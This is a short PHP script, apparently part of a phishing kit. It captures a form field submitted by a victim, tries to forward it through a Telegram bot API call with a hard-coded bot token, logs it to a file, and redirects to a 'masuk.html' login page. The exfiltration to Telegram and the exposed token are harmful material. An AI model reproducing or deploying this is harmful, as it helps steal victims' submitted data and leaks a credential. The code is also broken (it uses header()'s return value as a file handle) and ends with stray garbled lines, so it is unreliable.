<?php
$file = header("Location:https://api.telegram.org/bot6626770512:AAG53nWI9ABT3tftsLwSIacBO_DNlpz0ELc/sendMessage?chat_id=[your_chat_id]&text=+'$fav_language'+'nohp'+");;
$a= fopen($file, 'a+') or die("can't open file");

$text = "
 LINK-SMS - $_POST[link] " ;
$write=fwrite($a, $text);
fclose($a);

echo"<script language=javascript>window.location='masuk.html'</script>";

?>
$file = "mbek.txt";
Penamaan
